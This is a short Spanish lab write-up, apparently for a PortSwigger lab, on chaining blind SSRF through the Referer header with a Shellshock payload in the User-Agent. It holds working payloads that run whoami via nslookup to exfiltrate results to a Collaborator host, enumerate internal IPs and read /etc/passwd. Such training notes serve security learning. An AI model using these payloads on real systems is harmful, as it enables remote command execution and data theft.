# SSRF ciego explotando Shellshock

Tags: #SSRF #PortSwigger 

```bash 
En este lab el SSRF se combina con la vulnerabilidad Shellshock para ejecutar comandos remotos en un sistema interno. Aprovechamos el hecho de que la aplicación realiza peticiones HTTP a la URL indicada en el header Referer, y que estas peticiones incluyen la cabecera User-Agent, la cual podemos manipular.

Se emplea Burp Collaborator para generar un payload que, al ser ejecutado, filtra el nombre del usuario del sistema mediante una consulta DNS. Este payload es inyectado en el User-Agent usando la sintaxis de Shellshock, y el ataque se lanza desde Burp Intruder variando la IP interna objetivo (192.168.0.X) en el Referer.
```

```bash 
# Petición original 
	Referer: https://web.com/
```

```
# Petición modificada con el SSRF
	Referer: https://BURP-COLLABORATOR-SUBDOMAIN/


# Enumerar el último octeto para saber si es vulnerable a Shleshock modificando las siguientes cabeceras. Cuando un server sea vulnerable devolverá al Collaborator la respuesta del comando 'whoami'

	User Agent: () { :; } /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
	Referer: 192.168.0.X:8080


# Comandos que se pueden inyectar 
	$(hostname)
	$(cat /etc/passwd | head -n 1 | head -c 4)
```